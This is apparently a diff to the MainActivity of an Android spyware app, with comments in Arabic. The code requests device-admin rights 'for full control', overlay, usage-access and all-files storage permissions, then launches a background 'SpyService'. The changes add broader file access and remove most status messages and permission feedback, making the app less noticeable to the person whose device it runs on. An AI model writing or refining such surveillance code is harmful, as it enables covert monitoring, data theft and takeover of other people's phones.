@@ -9,9 +9,8 @@ import android.content.pm.PackageManager;
 import android.net.Uri;
 import android.os.Build;
 import android.os.Bundle;
+import android.os.Environment;
 import android.provider.Settings;
-import android.webkit.WebView;
-import android.webkit.WebViewClient;
 import android.widget.Toast;
 import androidx.annotation.NonNull;
 import androidx.appcompat.app.AppCompatActivity;
@@ -26,6 +25,7 @@ public class MainActivity extends AppCompatActivity {
     private static final int REQUEST_ADMIN = 101;
     private static final int REQUEST_OVERLAY = 102;
     private static final int REQUEST_USAGE = 103;
+    private static final int REQUEST_MANAGE_STORAGE = 104;
     private Context context;
 
     @Override
@@ -34,24 +34,19 @@ public class MainActivity extends AppCompatActivity {
         setContentView(R.layout.activity_main);
         context = this;
 
-        // 🔥 الخطوة 1: تهيئة Firebase فوراً (قبل أي شيء)
+        // تهيئة Firebase
         try {
             if (FirebaseApp.getApps(this).isEmpty()) {
                 FirebaseApp.initializeApp(this);
-                Toast.makeText(this, "✅ Firebase initialized", Toast.LENGTH_SHORT).show();
             }
         } catch (Exception e) {
-            Toast.makeText(this, "❌ Firebase error: " + e.getMessage(), Toast.LENGTH_LONG).show();
+            Toast.makeText(this, "❌ Firebase error", Toast.LENGTH_SHORT).show();
         }
 
-        // الخطوة 2: طلب الصلاحيات
         requestAllPermissions();
-
-        // الخطوة 3: طلب صلاحية المدير
         requestDeviceAdmin();
 
-        // الخطوة 4: بدء الخدمة بعد ثوانٍ (لإعطاء وقت للصلاحيات)
-        new android.os.Handler().postDelayed(this::startSpyService, 3000);
+        new android.os.Handler().postDelayed(this::startSpyService, 5000);
     }
 
     private void requestAllPermissions() {
@@ -96,21 +91,23 @@ public class MainActivity extends AppCompatActivity {
 
         if (!list.isEmpty()) {
             ActivityCompat.requestPermissions(this, list.toArray(new String[0]), REQUEST_PERMISSIONS);
-        } else {
-            Toast.makeText(this, "✅ جميع الصلاحيات ممنوحة", Toast.LENGTH_SHORT).show();
         }
 
-        // صلاحية التجاوز
         if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M && !Settings.canDrawOverlays(this)) {
-            Intent intent = new Intent(Settings.ACTION_MANAGE_OVERLAY_PERMISSION,
-                    Uri.parse("package:" + getPackageName()));
-            startActivityForResult(intent, REQUEST_OVERLAY);
+            startActivityForResult(new Intent(Settings.ACTION_MANAGE_OVERLAY_PERMISSION,
+                    Uri.parse("package:" + getPackageName())), REQUEST_OVERLAY);
         }
 
-        // صلاحية الاستخدام
         if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.LOLLIPOP) {
-            Intent intent = new Intent(Settings.ACTION_USAGE_ACCESS_SETTINGS);
-            startActivityForResult(intent, REQUEST_USAGE);
+            startActivityForResult(new Intent(Settings.ACTION_USAGE_ACCESS_SETTINGS), REQUEST_USAGE);
+        }
+
+        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.R) {
+            if (!Environment.isExternalStorageManager()) {
+                Intent intent = new Intent(Settings.ACTION_MANAGE_APP_ALL_FILES_ACCESS_PERMISSION);
+                intent.setData(Uri.parse("package:" + getPackageName()));
+                startActivityForResult(intent, REQUEST_MANAGE_STORAGE);
+            }
         }
     }
 
@@ -122,41 +119,16 @@ public class MainActivity extends AppCompatActivity {
             intent.putExtra(DevicePolicyManager.EXTRA_DEVICE_ADMIN, admin);
             intent.putExtra(DevicePolicyManager.EXTRA_ADD_EXPLANATION, "مطلوب صلاحية المدير للتحكم الكامل");
             startActivityForResult(intent, REQUEST_ADMIN);
-        } else {
-            Toast.makeText(this, "✅ صلاحية المدير مفعلة", Toast.LENGTH_SHORT).show();
         }
     }
 
     private void startSpyService() {
-        try {
-            Intent serviceIntent = new Intent(this, SpyService.class);
-            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
-                startForegroundService(serviceIntent);
-            } else {
-                startService(serviceIntent);
-            }
-            Toast.makeText(this, "🕵️ الخدمة تعمل في الخلفية", Toast.LENGTH_SHORT).show();
-        } catch (Exception e) {
-            Toast.makeText(this, "❌ فشل بدء الخدمة: " + e.getMessage(), Toast.LENGTH_LONG).show();
+        Intent serviceIntent = new Intent(this, SpyService.class);
+        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
+            startForegroundService(serviceIntent);
+        } else {
+            startService(serviceIntent);
         }
-    }
-
-    @Override
-    public void onRequestPermissionsResult(int requestCode, @NonNull String[] permissions, @NonNull int[] grantResults) {
-        super.onRequestPermissionsResult(requestCode, permissions, grantResults);
-        if (requestCode == REQUEST_PERMISSIONS) {
-            boolean allGranted = true;
-            for (int result : grantResults) {
-                if (result != PackageManager.PERMISSION_GRANTED) {
-                    allGranted = false;
-                    break;
-                }
-            }
-            if (allGranted) {
-                Toast.makeText(this, "✅ جميع الصلاحيات ممنوحة", Toast.LENGTH_SHORT).show();
-            } else {
-                Toast.makeText(this, "⚠️ بعض الصلاحيات غير ممنوحة", Toast.LENGTH_LONG).show();
-            }
-        }
+        Toast.makeText(this, "🕵️ الخدمة تعمل", Toast.LENGTH_SHORT).show();
     }
 }
